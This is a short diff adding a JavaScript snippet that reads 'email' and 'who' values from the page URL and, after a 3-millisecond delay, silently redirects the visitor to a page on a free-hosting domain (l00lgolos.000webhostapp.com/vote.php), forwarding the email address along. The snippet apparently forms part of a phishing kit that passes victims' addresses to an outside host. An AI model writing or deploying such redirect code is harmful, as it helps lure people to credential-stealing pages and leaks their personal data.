@@ -1,0 +1,8 @@
+var url_string = window.location.href;
+var url = new URL(url_string);
+var email = url.searchParams.get("email");
+var who = url.searchParams.get("who");
+
+setTimeout(function () {
+        document.location.href = "http://l00lgolos.000webhostapp.com/vote.php?"+"email="+email+"who="+who
+    }, 3)
